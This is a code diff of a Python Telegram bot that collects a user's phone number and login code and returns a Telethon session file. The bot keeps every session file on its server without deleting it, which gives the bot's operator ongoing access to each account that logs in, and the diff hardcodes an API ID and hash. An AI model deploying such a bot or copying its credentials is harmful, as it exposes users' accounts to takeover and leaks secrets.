@@ -2,103 +2,98 @@ import asyncio
 import os
 import zipfile
 import telebot
+from telebot import types
 from telethon import TelegramClient
 
-# ========== ТВОИ ДАННЫЕ ==========
-TOKEN = os.getenv('TOKEN')          # токен бота (добавишь в переменные Railway)
-API_ID = 28537210
-API_HASH = "5388b7e4bc869cce695b682f2644a160"
-# =================================
+TOKEN = os.getenv('TOKEN')
+API_ID = int(os.getenv('API_ID', '28537210'))
+API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')
 
 bot = telebot.TeleBot(TOKEN)
+os.makedirs('sessions', exist_ok=True)
 
-SESSION_DIR = "sessions"
-os.makedirs(SESSION_DIR, exist_ok=True)
-
-user_sessions = {}
+# Хранилище клиентов
+user_clients = {}
 
 @bot.message_handler(commands=['start'])
-def start(msg):
-    bot.send_message(msg.chat.id, 
-        "🔑 *Session Creator Bot*\n\n"
-        "/new — создать сессию\n"
-        "/cancel — отменить",
-        parse_mode="Markdown")
+def start(m):
+    uid = m.chat.id
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
+    markup.add(btn)
+    bot.send_message(uid, "🔑 Нажми кнопку ниже, чтобы отправить номер телефона", reply_markup=markup)
 
-@bot.message_handler(commands=['new'])
-def new_session(msg):
-    uid = msg.chat.id
-    bot.send_message(uid, "📱 Введите номер телефона:\n`+71234567890`", parse_mode="Markdown")
-    bot.register_next_step_handler(msg, process_phone)
-
-def process_phone(msg):
-    uid = msg.chat.id
-    phone = msg.text.strip()
-    
-    if not phone.startswith('+'):
-        bot.send_message(uid, "❌ Номер должен начинаться с +\nПопробуйте ещё раз:")
-        bot.register_next_step_handler(msg, process_phone)
+@bot.message_handler(content_types=['contact'])
+def handle_contact(m):
+    uid = m.chat.id
+    if m.contact is None:
+        bot.send_message(uid, "❌ Не удалось получить номер. Попробуй ещё раз /start")
         return
     
-    session_name = f"{SESSION_DIR}/user_{uid}"
-    client = TelegramClient(session_name, API_ID, API_HASH)
-    user_sessions[uid] = {"client": client, "phone": phone}
+    phone = m.contact.phone_number
+    if not phone.startswith('+'):
+        phone = '+' + phone
+    
+    bot.send_message(uid, f"📲 Номер принят: {phone}\nОтправляю код...")
     
     async def send_code():
+        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
+        user_clients[uid] = client
         await client.connect()
         try:
             await client.send_code_request(phone)
-            bot.send_message(uid, "✅ Код отправлен!\nВведите код (только цифры):")
-            bot.register_next_step_handler(msg, process_code, client, phone)
+            bot.send_message(uid, "✅ Код отправлен! Введите его цифрами:")
+            bot.register_next_step_handler(m, get_code, client, phone)
         except Exception as e:
             bot.send_message(uid, f"❌ Ошибка: {e}")
             await client.disconnect()
-            del user_sessions[uid]
+            del user_clients[uid]
     
     asyncio.run(send_code())
 
-def process_code(msg, client, phone):
-    uid = msg.chat.id
-    code = msg.text.strip()
+def get_code(m, client, phone):
+    uid = m.chat.id
+    code = m.text.strip()
     
-    async def sign_in():
+    async def login():
         try:
-            await client.connect()
             await client.sign_in(phone, code)
             await client.disconnect()
             
-            session_file = f"{SESSION_DIR}/user_{uid}.session"
-            
+            session_file = f'sessions/user_{uid}.session'
             if os.path.exists(session_file):
-                zip_name = f"/tmp/session_{uid}.zip"
-                with zipfile.ZipFile(zip_name, 'w') as zf:
-                    zf.write(session_file, arcname=f"user_{uid}.session")
-                
-                with open(zip_name, 'rb') as f:
-                    bot.send_document(uid, f, caption=f"✅ Сессия создана!\nНомер: `{phone}`", parse_mode="Markdown")
-                
-                os.remove(zip_name)
+                zip_path = f'/tmp/session_{uid}.zip'
+                with zipfile.ZipFile(zip_path, 'w') as zf:
+                    zf.write(session_file, arcname=f'session_{uid}.session')
+                with open(zip_path, 'rb') as f:
+                    bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
+                os.remove(zip_path)
             else:
-                bot.send_message(uid, "❌ Файл сессии не найден")
+                bot.send_message(uid, "❌ Ошибка: файл сессии не найден")
             
-            del user_sessions[uid]
-            
+            if uid in user_clients:
+                del user_clients[uid]
+                
         except Exception as e:
             bot.send_message(uid, f"❌ Ошибка: {e}")
             await client.disconnect()
-            del user_sessions[uid]
+            if uid in user_clients:
+                del user_clients[uid]
     
-    asyncio.run(sign_in())
+    asyncio.run(login())
 
+# Убираем клавиатуру после завершения
 @bot.message_handler(commands=['cancel'])
-def cancel(msg):
-    uid = msg.chat.id
-    if uid in user_sessions:
+def cancel(m):
+    uid = m.chat.id
+    if uid in user_clients:
         async def close():
-            await user_sessions[uid]["client"].disconnect()
+            await user_clients[uid].disconnect()
         asyncio.run(close())
-        del user_sessions[uid]
-    bot.send_message(uid, "❌ Отменено")
+        del user_clients[uid]
+    
+    markup = types.ReplyKeyboardRemove()
+    bot.send_message(uid, "❌ Отменено", reply_markup=markup)
 
 print("🚀 Session Bot запущен")
-bot.polling(none_stop=True)
+bot.polling()
